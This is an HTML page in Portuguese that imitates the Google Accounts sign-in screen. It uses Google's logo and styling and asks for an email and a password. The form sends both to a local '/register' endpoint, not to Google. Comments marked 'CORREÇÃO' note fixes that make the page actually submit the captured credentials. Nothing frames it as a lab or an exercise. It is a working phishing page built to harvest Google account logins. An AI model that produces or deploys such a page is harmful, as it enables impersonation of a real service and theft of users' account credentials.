<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fazer login - Contas Google</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&family=Open+Sans&display=swap');

        body {
            font-family: 'Roboto', sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            width: 100%;
            max-width: 360px;
            text-align: center;
            box-sizing: border-box;
        }

        .logo {
            width: 75px;
            height: auto;
            margin-bottom: 12px;
        }

        h1 {
            font-family: 'Open Sans', sans-serif;
            font-size: 24px;
            color: #202124;
            font-weight: 400;
            margin: 0;
        }

        .subtitle {
            font-size: 16px;
            color: #202124;
            margin-top: 8px;
            margin-bottom: 24px;
        }

        .input-group {
            position: relative;
            margin-bottom: 16px;
            text-align: left;
        }

        .form-input {
            width: calc(100% - 28px);
            padding: 13px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }

        .form-input:focus {
            outline: none;
            border: 2px solid #1a73e8;
        }

        .link {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
            display: inline-block;
        }

        .align-left {
            text-align: left;
            margin-top: 8px;
            margin-bottom: 24px;
        }

        .info-text {
            color: #5f6368;
            font-size: 14px;
            text-align: left;
            margin-top: 32px;
            margin-bottom: 32px;
        }

        .actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }

        .btn {
            background-color: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 8px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        
        .btn-link {
            background: none;
            border: none;
            color: #1a73e8;
            font-weight: 500;
            cursor: pointer;
            padding: 8px 0;
        }

    </style>
</head>
<body>

    <div class="login-container">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
        <h1>Login</h1>
        <p class="subtitle">Use sua Conta Google</p>
        
        <!-- CORREÇÃO: Formulário agora aponta para /register -->
        <form action="/register" method="POST">
            <div class="input-group">
                <!-- CORREÇÃO: Adicionado 'name' ao input -->
                <input type="email" id="email" name="email" class="form-input" required placeholder="E-mail ou telefone">
            </div>

             <div class="input-group">
                <!-- CORREÇÃO: Adicionado 'name' ao input -->
                <input type="password" id="password" name="password" class="form-input" required placeholder="Senha">
            </div>

            <div class="align-left">
                <a href="#" class="link">Esqueceu seu e-mail?</a>
            </div>

            <p class="info-text">Não está no seu computador? Use o modo visitante para fazer login com privacidade. <a href="#" class="link">Saiba mais</a></p>

            <div class="actions">
                <button type="button" class="btn-link">Criar conta</button>
                <!-- CORREÇÃO: Botão agora é do tipo 'submit' -->
                <button type="submit" class="btn">Próxima</button>
            </div>
        </form>
    </div>

</body>
</html>
